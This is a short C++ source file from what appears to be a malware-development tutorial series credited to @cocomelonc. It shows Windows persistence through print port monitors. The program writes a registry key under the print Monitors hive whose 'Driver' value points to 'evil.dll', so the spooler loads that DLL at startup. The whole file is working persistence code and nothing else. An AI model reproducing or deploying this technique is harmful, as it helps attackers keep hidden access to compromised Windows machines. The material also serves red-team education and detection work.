/*
pers.cpp
windows persistence via port monitors
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/06/19/malware-pers-8.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // subkey
  const char* sk = "SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";

  // evil DLL
  const char* evilDll = "evil.dll";

  // startup
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {

    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"Driver", 0, REG_SZ, (unsigned char*)evilDll, strlen(evilDll));
    RegCloseKey(hkey);
  } else {
    printf("failed to create new registry subkey :(");
    return -1;
  }
    return 0;
}

